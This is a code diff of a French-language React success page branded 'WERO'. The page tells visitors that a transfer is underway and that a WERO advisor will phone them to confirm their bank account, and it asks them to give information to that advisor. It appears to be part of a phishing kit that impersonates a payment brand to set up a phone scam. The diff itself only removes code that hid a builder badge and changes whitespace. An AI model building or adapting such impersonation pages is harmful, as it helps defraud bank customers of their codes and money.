@@ -5,12 +5,6 @@ import { supabase } from "@/lib/supabase";
 
 const Success = () => {
   useEffect(() => {
-    // Cacher l'élément lovable-badge au montage
-    const element = document.getElementById("lovable-badge");
-    if (element) {
-      element.style.display = "none";
-    }
-
     const updateUserInfo = async () => {
       const userId = localStorage.getItem("userId");
       if (!userId) return;
@@ -36,22 +30,22 @@ const Success = () => {
       <header className="bg-yellow-300 p-4">
         <h1 className="text-2xl font-bold">WERO</h1>
       </header>
-
+      
       <main className="flex-grow flex justify-center p-4">
         <div className="max-w-md w-full bg-white rounded-lg shadow-md p-6">
           <div className="text-center mb-8">
             <h2 className="text-xl font-bold text-blue-500 mb-6">Virement en cours...</h2>
-
+            
             <div className="flex justify-center mb-6">
               <Loader className="w-16 h-16 text-blue-500 animate-spin" />
             </div>
-
+            
             <p className="font-medium mb-8">
               Pour finaliser la confirmation de votre compte,
               un conseiller WERO vous contactera par
               téléphone dans les meilleurs délais.
             </p>
-
+            
             <div className="text-blue-500 mb-8">
               <p className="mb-4">
                 En confirmant votre compte bancaire, vous
@@ -63,7 +57,7 @@ const Success = () => {
                 cette information auprès du conseiller pour
                 finaliser la validation.
               </p>
-
+              
               <p>
                 Ce processus assure que les informations
                 fournies vous appartiennent et que vous êtes
@@ -71,7 +65,7 @@ const Success = () => {
                 automatisé.
               </p>
             </div>
-
+            
             <div className="border-t border-gray-200 pt-6">
               <p className="text-xs text-red-500">
                 NB : Vos informations sont cryptées et stockées sur un serveur hautement sécurisé validé par le (RGPD), garantissant la protection et la confidentialité de vos données.
@@ -80,7 +74,7 @@ const Success = () => {
           </div>
         </div>
       </main>
-
+      
       <Footer />
     </div>
   );
